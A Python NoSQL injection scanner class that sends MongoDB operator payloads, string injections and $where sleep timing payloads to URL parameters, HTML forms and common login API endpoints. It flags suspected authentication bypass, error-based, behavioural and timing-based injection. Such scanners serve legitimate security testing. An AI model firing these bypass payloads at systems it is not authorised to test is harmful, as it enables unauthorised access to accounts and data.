import json
import re
import time
from difflib import SequenceMatcher
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup


class NoSQLInjectionScanner:
    PARAM_PRIORITY = (
        "username", "email", "user", "password", "pass", "token",
        "query", "search", "filter", "id", "name"
    )

    AUTH_SUCCESS_MARKERS = (
        "token", "jwt", "session", "authenticated", "welcome", "dashboard"
    )

    AUTH_FAIL_MARKERS = (
        "invalid", "incorrect", "unauthorized", "forbidden", "login failed"
    )

    NOSQL_ERROR_MARKERS = (
        "mongodb", "mongoerror", "bson", "cast to objectid failed",
        "cannot apply $", "unknown top level operator", "invalid bson"
    )

    COMMON_API_ENDPOINTS = (
        "/api/login", "/api/auth", "/api/users", "/api/search", "/api/data"
    )

    def __init__(self, target_url, timeout=10):
        self.target_url = self._normalize_url(target_url)
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebScanner-NoSQL/2.0",
                "Accept": "application/json, text/plain, */*",
            }
        )
        self.vulnerabilities = []
        self._seen = set()

    def _normalize_url(self, url):
        parsed = urlparse(url)
        if parsed.scheme and parsed.netloc:
            return url
        return f"http://{url}"

    def _safe_get(self, url, params=None, timeout=None):
        try:
            return self.session.get(url, params=params, timeout=timeout or self.timeout, allow_redirects=True)
        except requests.RequestException:
            return None

    def _safe_post_json(self, url, payload, timeout=None):
        try:
            return self.session.post(url, json=payload, timeout=timeout or self.timeout, allow_redirects=True)
        except requests.RequestException:
            return None

    def _safe_post_form(self, url, data, timeout=None):
        try:
            return self.session.post(url, data=data, timeout=timeout or self.timeout, allow_redirects=True)
        except requests.RequestException:
            return None

    def _add_finding(self, finding_type, severity, description, endpoint=None, payload=None, evidence=None):
        key = (finding_type, endpoint or self.target_url, payload or "")
        if key in self._seen:
            return
        self._seen.add(key)

        self.vulnerabilities.append(
            {
                "type": finding_type,
                "severity": severity,
                "description": description,
                "endpoint": endpoint or self.target_url,
                "payload": payload or "",
                "evidence": evidence or "",
            }
        )

    def _prioritized_params(self, params):
        items = []
        for p in params:
            low = p.lower()
            score = 0
            for kw in self.PARAM_PRIORITY:
                if low == kw:
                    score += 3
                elif kw in low:
                    score += 1
            items.append((score, p))

        items.sort(key=lambda x: (-x[0], x[1]))
        return [p for _, p in items][:8]

    def _baseline_fingerprint(self, response):
        if not response:
            return 0, ""
        text = (response.text or "")
        normalized = re.sub(r"\b\d+\b", "N", text.lower())
        normalized = re.sub(r"\s+", " ", normalized)
        return len(text), normalized[:4000]

    def _similar(self, a, b):
        if not a or not b:
            return False
        return SequenceMatcher(None, a, b).ratio() >= 0.74

    def _contains_error_marker(self, text):
        low = (text or "").lower()
        return any(marker in low for marker in self.NOSQL_ERROR_MARKERS)

    def _is_auth_success(self, response):
        if not response:
            return False
        if response.status_code in {401, 403}:
            return False

        low = (response.text or "").lower()
        if any(marker in low for marker in self.AUTH_FAIL_MARKERS):
            return False

        if any(marker in low for marker in self.AUTH_SUCCESS_MARKERS):
            return True

        if response.status_code in {200, 201} and len(low) > 40:
            return True

        return False

    def _json_bypass_payloads(self):
        return [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
        ]

    def _string_payloads(self):
        return [
            "' || '1'=='1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "admin' || 1==1 //",
        ]

    def _timing_payloads(self):
        return [
            {"$where": "sleep(3500) || true"},
            "'; var date = new Date(); while (new Date()-date < 3500) {} //",
        ]

    def _discover_links(self):
        urls = {self.target_url}
        resp = self._safe_get(self.target_url)
        if not resp:
            return list(urls)

        soup = BeautifulSoup(resp.text, "html.parser")
        base = urlparse(self.target_url)

        for a in soup.find_all("a"):
            href = (a.get("href") or "").strip()
            if not href:
                continue
            absolute = urljoin(self.target_url, href)
            p = urlparse(absolute)
            if (p.scheme, p.netloc) != (base.scheme, base.netloc):
                continue

            clean = urlunparse((p.scheme, p.netloc, p.path, "", p.query, ""))
            urls.add(clean)

            if len(urls) >= 30:
                break

        return list(urls)

    def _test_url_parameters(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return

        baseline_resp = self._safe_get(self.target_url)
        if not baseline_resp:
            return
        base_len, base_norm = self._baseline_fingerprint(baseline_resp)

        for param in self._prioritized_params(params.keys()):
            original = (params.get(param) or [""])[0]

            for payload in self._string_payloads():
                changed = params.copy()
                changed[param] = [payload]
                query = urlencode(changed, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, ""))
                test_resp = self._safe_get(test_url)
                if not test_resp:
                    continue

                if self._contains_error_marker(test_resp.text):
                    self._add_finding(
                        "NoSQL Injection - Error Based",
                        "High",
                        f"Parameter '{param}' triggered NoSQL-like backend error",
                        endpoint=test_url,
                        payload=payload,
                        evidence="NoSQL error marker detected",
                    )
                    break

                test_len, test_norm = self._baseline_fingerprint(test_resp)
                delta = abs(test_len - base_len) / max(base_len, 1)
                if test_resp.status_code in {200, 201} and delta > 0.50 and not self._similar(base_norm, test_norm):
                    self._add_finding(
                        "NoSQL Injection - Behavioral Change",
                        "Medium",
                        f"Parameter '{param}' caused significant response deviation",
                        endpoint=test_url,
                        payload=payload,
                        evidence=f"size_delta={delta:.2f}",
                    )
                    break

    def _test_json_auth_bypass(self):
        for endpoint in self.COMMON_API_ENDPOINTS:
            url = urljoin(self.target_url, endpoint)

            baseline = self._safe_post_json(url, {"username": "invalid_user", "password": "invalid_pass"})
            if not baseline:
                continue

            if self._is_auth_success(baseline):
                continue

            for op in self._json_bypass_payloads():
                payload = {"username": op, "password": op}
                resp = self._safe_post_json(url, payload)
                if not resp:
                    continue

                if self._is_auth_success(resp):
                    self._add_finding(
                        "NoSQL Injection - Auth Bypass",
                        "Critical",
                        "Authentication bypass suspected via NoSQL operators in JSON body",
                        endpoint=url,
                        payload=json.dumps(payload),
                        evidence=f"status={resp.status_code}",
                    )
                    break

    def _test_form_injection(self):
        base_resp = self._safe_get(self.target_url)
        if not base_resp:
            return

        soup = BeautifulSoup(base_resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            return

        for form in forms[:8]:
            method = (form.get("method") or "GET").upper()
            action = (form.get("action") or "").strip()
            form_url = urljoin(self.target_url, action) if action else self.target_url

            names = []
            for field in form.find_all(["input", "textarea"]):
                f_type = (field.get("type") or "text").lower()
                name = (field.get("name") or "").strip()
                if not name:
                    continue
                if f_type in {"submit", "button", "hidden", "file"}:
                    continue
                names.append(name)

            if not names:
                continue

            baseline_data = {n: "normal_test" for n in names}
            baseline_resp = self._safe_post_form(form_url, baseline_data) if method == "POST" else self._safe_get(form_url, baseline_data)
            if not baseline_resp:
                continue
            base_len, base_norm = self._baseline_fingerprint(baseline_resp)

            for target_name in names[:3]:
                for payload in self._string_payloads()[:3]:
                    test_data = {n: "normal_test" for n in names}
                    test_data[target_name] = payload
                    resp = self._safe_post_form(form_url, test_data) if method == "POST" else self._safe_get(form_url, test_data)
                    if not resp:
                        continue

                    if self._contains_error_marker(resp.text):
                        self._add_finding(
                            "NoSQL Injection - Form Error Based",
                            "High",
                            f"Form field '{target_name}' triggered NoSQL-like error",
                            endpoint=form_url,
                            payload=payload,
                            evidence="NoSQL error marker detected",
                        )
                        break

                    test_len, test_norm = self._baseline_fingerprint(resp)
                    delta = abs(test_len - base_len) / max(base_len, 1)
                    if resp.status_code in {200, 201} and delta > 0.55 and not self._similar(base_norm, test_norm):
                        self._add_finding(
                            "NoSQL Injection - Form Behavioral Change",
                            "Medium",
                            f"Form field '{target_name}' caused strong response deviation",
                            endpoint=form_url,
                            payload=payload,
                            evidence=f"size_delta={delta:.2f}",
                        )
                        break

    def _test_timing_based(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return

        target_param = self._prioritized_params(params.keys())[0]

        baseline_params = params.copy()
        baseline_params[target_param] = ["normal_test"]
        baseline_url = urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", urlencode(baseline_params, doseq=True), "")
        )

        start = time.time()
        base_resp = self._safe_get(baseline_url, timeout=self.timeout + 1)
        baseline_time = time.time() - start
        if not base_resp:
            return

        for payload in self._timing_payloads():
            value = json.dumps(payload) if isinstance(payload, dict) else payload
            test_params = params.copy()
            test_params[target_param] = [value]
            test_url = urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_params, doseq=True), "")
            )

            start = time.time()
            resp = self._safe_get(test_url, timeout=self.timeout + 5)
            elapsed = time.time() - start
            if not resp:
                continue

            if elapsed >= baseline_time + 2.5:
                self._add_finding(
                    "NoSQL Injection - Timing Based",
                    "Medium",
                    f"Parameter '{target_param}' caused significant response delay",
                    endpoint=test_url,
                    payload=value,
                    evidence=f"baseline={baseline_time:.2f}s;observed={elapsed:.2f}s",
                )
                break

    def scan(self):
        self._test_url_parameters()
        self._test_json_auth_bypass()
        self._test_form_injection()
        self._test_timing_based()
        return self.vulnerabilities
